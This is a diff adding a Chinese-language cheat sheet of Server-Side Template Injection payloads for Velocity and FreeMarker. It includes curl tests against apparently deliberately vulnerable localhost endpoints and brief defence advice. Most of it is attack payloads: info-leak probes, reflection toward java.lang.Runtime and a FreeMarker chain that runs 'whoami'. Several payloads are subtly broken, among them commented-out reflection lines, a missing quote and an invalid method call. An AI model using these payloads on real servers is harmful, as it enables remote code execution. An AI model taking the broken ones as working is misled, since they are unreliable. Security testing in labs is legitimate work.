@@ -1,0 +1,217 @@
+# SSTI (Server-Side Template Injection) 测试 Payload
+# 服务器端模板注入测试 Payload
+
+## Velocity SSTI Payloads
+
+### 信息泄露 Payloads
+
+# 访问 Math 工具类
+$math
+
+# 访问 Scope
+$scope
+
+# 访问 Class
+$class
+
+# 访问 IteratorTool
+$iterator
+
+# 访问 RenderTool
+$render
+
+# 访问 EventCartridge
+$eventhandler
+
+### 基本语法 Payloads
+
+# 变量赋值和输出
+#set($x=1)$x
+
+# 字符串操作
+${"hello"}
+
+# if 语句
+#if(1==1)true#end
+
+# 循环
+#foreach($i in [1..3])$i#end
+
+### 高级利用 Payloads
+
+# 反射调用
+#set($x='')##$x.class.forName('java.lang.Runtime')
+
+# 获取 ClassLoader
+#set($x='')##$x.class.forName('java.lang.ClassLoader')
+
+# 访问系统属性
+$runtime.class.forName('java.lang.System').getRuntime()
+
+# 数学计算
+#set($result=$math.pow(2,10))$result
+
+### 上下文变量测试
+
+# 使用 name 变量
+Hello $name!
+
+# 字符串拼接
+${name} - User
+
+# 条件判断
+#if($name=="admin)Admin#else Guest#end
+
+---
+
+## FreeMarker SSTI Payloads
+
+### 信息泄露 Payloads
+
+# API 信息泄露
+"test"?api
+
+# 访问 API
+${"test"?api}
+
+# 获取 Class
+${"test"?api.getClass()}
+
+# 获取 ClassLoader
+${"test"?api.class.getClassLoader()}
+
+# 获取构造函数
+${"test"?api.class.getConstructors()}
+
+### 基本语法 Payloads
+
+# 变量输出
+${"hello"}
+
+# 默认值
+${name!"guest"}
+
+# if 语句
+<#if true>true</#if>
+
+# list 循环
+<#list [1,2,3] as x>${x}</#list>
+
+### 高级利用 Payloads
+
+# 获取 ClassLoader
+<#assign classloader=object?api.class.getClassLoader()>
+
+# 加载类
+<#assign ex=classloader.loadClass("java.lang.Runtime")>
+
+# 获取方法
+<#assign method=ex.getRuntime()>
+
+# 执行命令
+<#assign result=method.exec("whoami")>
+
+### 内置函数 Payloads
+
+# 大写转换
+${"hello"?upper_case}
+
+# 小写转换
+${"HELLO"?lower_case}
+
+# 获取类型
+${"test"?api.getClass().getName()}
+
+### 上下文变量测试
+
+# 使用 name 变量
+Hello ${name!"guest"}!
+
+# 条件判断
+<#if name=="admin">Admin<#else>Guest</#if>
+
+# 赋值和使用
+<#assign greeting="Hello ${name}!">${greeting}
+
+---
+
+## 测试命令示例
+
+### Velocity 测试
+
+# 测试基本渲染
+curl "http://localhost:8080/ssti/velocity/vuln?template=\${\"hello\"}"
+
+# 测试信息泄露 ($math)
+curl "http://localhost:8080/ssti/velocity/vuln?template=\$math"
+
+# 测试变量操作
+curl "http://localhost:8080/ssti/velocity/vuln?template=#set(\$x=1+1)\$x"
+
+# 测试 vuln2 端点（带上下文）
+curl "http://localhost:8080/ssti/velocity/vuln2?template=Hello+\$name!&name=admin"
+
+### FreeMarker 测试
+
+# 测试基本渲染
+curl "http://localhost:8080/ssti/freemarker/vuln?template=\${\"hello\"}"
+
+# 测试 API 信息泄露
+curl "http://localhost:8080/ssti/freemarker/vuln?template=\${\"test\"?api}"
+
+# 测试 if 语句
+curl "http://localhost:8080/ssti/freemarker/vuln?template=<#if+true>true<#else>false</#if>"
+
+# 测试 vuln2 端点（带上下文）
+curl "http://localhost:8080/ssti/freemarker/vuln2?template=Hello+\${name}!&name=admin"
+
+---
+
+## URL 编码注意事项
+
+在 curl 中使用时，某些字符需要 URL 编码：
+
+| 字符 | 编码 | 说明 |
+|------|------|------|
+| $ | %24 | Velocity 变量前缀 |
+| { | %7B | 左花括号 |
+| } | %7D | 右花括号 |
+| # | %23 | FreeMarker/Velocity 指令前缀 |
+| < | %3C | 左尖括号 |
+| > | %3E | 右尖括号 |
+| " | %22 | 双引号 |
+| 空格 | + 或 %20 | 空格 |
+
+---
+
+## 常见利用技巧
+
+### Velocity 利用
+
+1. **信息收集**
+   - 使用 $math、$scope、$class 等内置变量收集信息
+   - 尝试访问 Java 类和方法
+
+2. **RCE 路径**
+   - 通过反射获取 Runtime 类
+   - 构造复杂的 gadget chain
+
+### FreeMarker 利用
+
+1. **API 信息泄露**
+   - 使用 ?api 获取对象信息
+   - 遍历方法和属性
+
+2. **RCE 路径**
+   - 通过 ClassLoader 加载危险类
+   - 使用 TemplateModel 执行任意代码
+
+---
+
+## 防御建议
+
+1. **永远不要直接渲染用户输入的模板**
+2. **使用预定义的模板文件**
+3. **限制模板语法和可访问的类**
+4. **启用沙箱模式**
+5. **对用户输入进行严格的验证和过滤**
